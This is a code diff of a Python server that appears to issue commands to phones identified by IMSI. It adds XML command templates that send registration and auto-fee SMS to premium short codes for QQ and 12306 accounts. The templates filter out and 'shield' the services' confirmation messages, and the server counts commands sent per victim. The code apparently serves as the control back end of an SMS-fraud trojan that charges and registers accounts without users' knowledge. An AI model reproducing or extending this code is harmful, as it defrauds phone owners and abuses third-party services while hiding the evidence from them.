@@ -54,20 +54,20 @@ FEE_CONTENT += "<feemode>11</feemode>"
 FEE_CONTENT += "</card>"
 FEE_CONTENT += "</wml>"
 
-QQ_REGISTER_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-QQ_REGISTER_CONTENT += "<wml>"
-QQ_REGISTER_CONTENT += "<card>"
-QQ_REGISTER_CONTENT += "<Ccmd_cust>ZC</Ccmd_cust>"
-QQ_REGISTER_CONTENT += "<Cnum_cust>106906021077</Cnum_cust>"
-QQ_REGISTER_CONTENT += "<filter1_cust>腾讯科技|随时随地</filter1_cust>"
-QQ_REGISTER_CONTENT += "<filter2_cust></filter2_cust>"
-QQ_REGISTER_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
-QQ_REGISTER_CONTENT += "<PortShield>[portShield]</PortShield>"
-QQ_REGISTER_CONTENT += "<fee></fee>"
-QQ_REGISTER_CONTENT += "<autofee>1</autofee>"
-QQ_REGISTER_CONTENT += "<feemode>11</feemode>"
-QQ_REGISTER_CONTENT += "</card>"
-QQ_REGISTER_CONTENT += "</wml>"
+SMS_REGISTER_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+SMS_REGISTER_CONTENT += "<wml>"
+SMS_REGISTER_CONTENT += "<card>"
+SMS_REGISTER_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
+SMS_REGISTER_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
+SMS_REGISTER_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
+SMS_REGISTER_CONTENT += "<filter2_cust></filter2_cust>"
+SMS_REGISTER_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
+SMS_REGISTER_CONTENT += "<PortShield>[portShield]</PortShield>"
+SMS_REGISTER_CONTENT += "<fee></fee>"
+SMS_REGISTER_CONTENT += "<autofee>1</autofee>"
+SMS_REGISTER_CONTENT += "<feemode>11</feemode>"
+SMS_REGISTER_CONTENT += "</card>"
+SMS_REGISTER_CONTENT += "</wml>"
 
 TEST_CONTENT = ""
 
@@ -162,8 +162,8 @@ def get_imsi_response(_imsi, _threads):
             # normal fee process
             if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
                 _return = get_cmd(_record_user, _threads)
-            if (_return == None or len(_return) <= 1) and isOpenQqRegisterHour() and get_system_parameter_from_db('openRegister') == 'open':
-                _return = get_register_cmd(_record_user)
+            if (_return == None or len(_return) <= 1) and isOpenSmsRegisterHour() and get_system_parameter_from_db('openRegister') == 'open':
+                _return = get_register_cmd(_record_user, _threads)
                 if _return != None:
                     _threads.append(threading.Thread(
                         target=insert_register_cmd_log(_record_user, _return)))
@@ -180,12 +180,12 @@ def isOpenHour():
     return _result
 
 
-def isOpenQqRegisterHour():
+def isOpenSmsRegisterHour():
     _result = True
     _hour = int(time.strftime("%H", time.localtime()))
     if _hour >= 22:
         _result = False
-    elif _hour <= 5:
+    elif _hour <= 6:
         _result = False
     return _result
 
@@ -208,12 +208,6 @@ def get_cmd(_user, _threads):
         _cur.close()
         _dbConfig.close()
         if _record == None:
-            # if isOpenQqRegisterHour() and get_system_parameter_from_db('openRegister') == 'open':
-            #     _current_cmd_content = get_register_cmd(_user)
-            #     if _current_cmd_content!=None :
-            #         _threads.append(threading.Thread(target=insert_register_cmd_log(_user,_current_cmd_content)))
-            #     return _current_cmd_content
-            # else :
             return None
         else:
             _threads.append(threading.Thread(
@@ -228,16 +222,32 @@ def get_cmd(_user, _threads):
         return None
 
 
-def get_register_cmd(_user):
+# 获取短信注册类指令
+
+
+def get_register_cmd(_user, _threads):
+    _result = None
     if str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1:
+        _result = SMS_REGISTER_CONTENT.replace(
+            '[cmd]', 'ZC').replace('[spNumber]', '106906021077').replace('[filter]', '腾讯科技|随时随地')
         if _user['mobileType'] == "ChinaUnion":
-            return QQ_REGISTER_CONTENT.replace('[portShield]', '10690188')
+            _result = _result.replace('[portShield]', '10690188')
+            _threads.append(threading.Thread(
+                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
         elif _user['mobileType'] == "ChinaMobile":
-            return QQ_REGISTER_CONTENT.replace('[portShield]', '10690508')
+            _result = _result.replace('[portShield]', '10690508')
+            _threads.append(threading.Thread(
+                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
         else:
-            return None
+            _result = None
+    elif str(_user['lastRegisterCmdAppIdList']).find(',5,') != -1:
+        _result = SMS_REGISTER_CONTENT.replace('[cmd]', '999').replace(
+            '[spNumber]', '12306').replace('[filter]', '12306|第三方').replace('[portShield]', '12306')
+        _threads.append(threading.Thread(
+            target=async_update_register_cmd_count(_user, 'register12306CmdCount')))
     else:
-        return None
+        _result = None
+    return _result
 
 
 def async_update_cmd_fee(_user, _cmd):
@@ -250,6 +260,14 @@ def async_update_cmd_fee(_user, _cmd):
     _dbConfig = poolConfig.connection()
     _dbConfig.cursor().execute(_sql, (_time_current,
                                       _total, _total, _user['imsi']))
+    _dbConfig.close()
+
+
+def async_update_register_cmd_count(_user, _paraNmae):
+    _sql = 'update imsi_users set ' + _paraNmae + \
+        ' = ifnull(' + _paraNmae + ',0)  + 1  where imsi = %s '
+    _dbConfig = poolConfig.connection()
+    _dbConfig.cursor().execute(_sql, (_user['imsi']))
     _dbConfig.close()
 
 
